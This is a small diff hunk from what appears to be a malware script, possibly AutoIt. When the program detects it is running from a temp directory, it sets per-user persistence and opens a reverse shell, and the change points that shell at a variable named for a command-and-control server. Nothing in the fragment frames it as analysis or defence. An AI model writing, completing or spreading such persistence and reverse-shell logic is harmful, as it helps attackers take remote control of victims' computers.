@@ -25,7 +25,7 @@ if isRunningFromTemp() Then
 
    SetPersistent4CurrentUser()
 
-   ReverseShell($RemoteIp)
+   ReverseShell($c2server)
 
 Else
 
